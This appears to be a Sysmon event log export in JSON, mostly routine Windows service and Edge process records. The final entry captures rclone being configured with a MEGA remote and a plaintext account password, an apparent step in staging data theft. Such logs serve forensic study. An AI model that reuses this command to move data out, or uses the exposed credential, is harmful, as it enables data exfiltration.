+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.9408607
+   },
+   "EventRecordID": 57,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.915",
+   "ProcessGuid": "10DA3E43-D902-63F8-A900-000000000900",
+   "ProcessId": 5576,
+   "Image": "C:\\Windows\\System32\\SgrmBroker.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "System Guard Runtime Monitor Broker Service",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "SgrmBroker.exe",
+   "CommandLine": "C:\\Windows\\system32\\SgrmBroker.exe",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=F9CBF1FF87D6F11920C4B7367EA2178BF13AA276C65D918950683983F268BC1F",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252867.3146975
+   },
+   "EventRecordID": 58,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:27.246",
+   "ProcessGuid": "10DA3E43-D903-63F8-AA00-000000000900",
+   "ProcessId": 4752,
+   "Image": "C:\\Windows\\System32\\sppsvc.exe",
+   "FileVersion": "10.0.19041.631 (WinBuild.160101.0800)",
+   "Description": "Microsoft Software Protection Platform Service",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "sppsvc.exe",
+   "CommandLine": "C:\\Windows\\system32\\sppsvc.exe",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "NT AUTHORITY\\NETWORK SERVICE",
+   "LogonGuid": "10DA3E43-6524-63F9-E403-000000000000",
+   "LogonId": 996,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=F9BBD70F8F47043B4F2921C388C27303F7201F553D590612273A99D9D4D07D4E",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252867.3995695
+   },
+   "EventRecordID": 59,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:27.391",
+   "ProcessGuid": "10DA3E43-D902-63F8-A700-000000000900",
+   "ProcessId": 5444,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252867.5012271
+   },
+   "EventRecordID": 60,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:27.486",
+   "ProcessGuid": "10DA3E43-D903-63F8-AB00-000000000900",
+   "ProcessId": 5036,
+   "Image": "C:\\Program Files\\Microsoft Update Health Tools\\uhssvc.exe",
+   "FileVersion": "10.0.19041.1675 (WinBuild.160101.0800)",
+   "Description": "Microsoft Update Health Service",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "uhssvc",
+   "CommandLine": "\"C:\\Program Files\\Microsoft Update Health Tools\\uhssvc.exe\"",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=78AEDD6D13C45B2E080BC26527CCF3BDABF764A2108249BA8B3AC4387C6A6376",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252867.7542129
+   },
+   "EventRecordID": 61,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:27.740",
+   "ProcessGuid": "10DA3E43-D903-63F8-AC00-000000000900",
+   "ProcessId": 4392,
+   "Image": "C:\\Windows\\System32\\MoUsoCoreWorker.exe",
+   "FileVersion": "10.0.19041.630 (WinBuild.160101.0800)",
+   "Description": "MoUSO Core Worker Process",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "MoUSOCoreWorker.exe",
+   "CommandLine": "C:\\Windows\\System32\\mousocoreworker.exe -Embedding",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=AF4F38395541C0315B188A2C3F63EFFD77011F5D0C21381A19EE9ED3224F9615",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252867.856408
+   },
+   "EventRecordID": 62,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:27.817",
+   "ProcessGuid": "10DA3E43-D903-63F8-AD00-000000000900",
+   "ProcessId": 1580,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Services",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "svchost.exe",
+   "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\LOCAL SERVICE",
+   "LogonGuid": "10DA3E43-6525-63F9-E503-000000000000",
+   "LogonId": 997,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252871.1501184
+   },
+   "EventRecordID": 63,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:31.144",
+   "ProcessGuid": "10DA3E43-D907-63F8-AE00-000000000900",
+   "ProcessId": 5992,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Services",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "svchost.exe",
+   "CommandLine": "C:\\Windows\\system32\\svchost.exe -k wusvcs -p",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252871.5781424
+   },
+   "EventRecordID": 64,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:31.568",
+   "ProcessGuid": "10DA3E43-D907-63F8-AF00-000000000900",
+   "ProcessId": 5828,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "FileVersion": "110.0.1587.50",
+   "Description": "Microsoft Edge",
+   "Product": "Microsoft Edge",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedge.exe",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=760 --field-trial-handle=2184,i,12503708684359893713,13292805670728289041,131072 /prefetch:8",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\110.0.1587.50\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Low",
+   "Hashes": "SHA256=470EA019C1EA8882B258DEA27E77261DD297EB225FD08EDBE591C82796189D75",
+   "ParentProcessGuid": "10DA3E43-D8A8-63F8-7100-000000000900",
+   "ParentProcessId": 4580,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252871.8521247
+   },
+   "EventRecordID": 65,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:31.839",
+   "ProcessGuid": "10DA3E43-D902-63F8-A500-000000000900",
+   "ProcessId": 5152,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252871.8992608
+   },
+   "EventRecordID": 66,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:31.895",
+   "ProcessGuid": "10DA3E43-D907-63F8-AF00-000000000900",
+   "ProcessId": 5828,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252874.395213
+   },
+   "EventRecordID": 67,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:34.383",
+   "ProcessGuid": "10DA3E43-6525-63F9-1D00-000000000900",
+   "ProcessId": 1268,
+   "Image": "C:\\Windows\\system32\\svchost.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252876.9027104
+   },
+   "EventRecordID": 68,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:36.893",
+   "ProcessGuid": "10DA3E43-D902-63F8-A800-000000000900",
+   "ProcessId": 5440,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "User": "NT AUTHORITY\\NETWORK SERVICE"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252878.8149936
+   },
+   "EventRecordID": 69,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:38.723",
+   "ProcessGuid": "10DA3E43-D903-63F8-AC00-000000000900",
+   "ProcessId": 4392,
+   "Image": "C:\\Windows\\System32\\MoUsoCoreWorker.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252879.357283
+   },
+   "EventRecordID": 70,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:39.341",
+   "ProcessGuid": "10DA3E43-D89C-63F8-6000-000000000900",
+   "ProcessId": 3912,
+   "Image": "C:\\Windows\\System32\\SearchProtocolHost.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252879.364709
+   },
+   "EventRecordID": 71,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:39.362",
+   "ProcessGuid": "10DA3E43-D89C-63F8-6100-000000000900",
+   "ProcessId": 3988,
+   "Image": "C:\\Windows\\System32\\SearchFilterHost.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252896.8520737
+   },
+   "EventRecordID": 72,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:56.839",
+   "ProcessGuid": "10DA3E43-D920-63F8-B000-000000000900",
+   "ProcessId": 5420,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "FileVersion": "110.0.1587.50",
+   "Description": "Microsoft Edge",
+   "Product": "Microsoft Edge",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedge.exe",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.19041.546 --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=4856 --field-trial-handle=2184,i,12503708684359893713,13292805670728289041,131072 /prefetch:2",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\110.0.1587.50\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=470EA019C1EA8882B258DEA27E77261DD297EB225FD08EDBE591C82796189D75",
+   "ParentProcessGuid": "10DA3E43-D8A8-63F8-7100-000000000900",
+   "ParentProcessId": 4580,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252897.0541472
+   },
+   "EventRecordID": 73,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:57.040",
+   "ProcessGuid": "10DA3E43-D920-63F8-B000-000000000900",
+   "ProcessId": 5420,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252897.6349473
+   },
+   "EventRecordID": 74,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:57.618",
+   "ProcessGuid": "10DA3E43-D903-63F8-AA00-000000000900",
+   "ProcessId": 4752,
+   "Image": "C:\\Windows\\System32\\sppsvc.exe",
+   "User": "NT AUTHORITY\\NETWORK SERVICE"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252903.925629
+   },
+   "EventRecordID": 75,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:03.923",
+   "ProcessGuid": "10DA3E43-D8FF-63F8-A200-000000000900",
+   "ProcessId": 5416,
+   "Image": "C:\\Windows\\System32\\RuntimeBroker.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252907.5418031
+   },
+   "EventRecordID": 76,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:07.336",
+   "ProcessGuid": "10DA3E43-D92B-63F8-B100-000000000900",
+   "ProcessId": 3820,
+   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
+   "FileVersion": "1.61.1",
+   "Description": "Rsync for cloud storage",
+   "Product": "Rclone",
+   "Company": "https://rclone.org",
+   "OriginalFileName": "rclone.exe",
+   "CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI",
+   "CurrentDirectory": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961",
+   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
+   "ParentProcessId": 5888,
